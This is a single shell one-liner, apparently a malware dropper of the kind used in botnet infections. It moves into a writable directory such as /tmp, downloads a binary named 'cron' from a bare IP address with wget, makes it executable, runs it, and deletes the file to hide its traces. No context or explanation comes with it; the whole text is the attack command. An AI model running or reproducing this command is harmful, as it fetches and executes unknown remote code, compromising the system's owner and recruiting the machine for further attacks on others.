cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.131/cron; chmod +x cron; ./cron; rm -rf cron
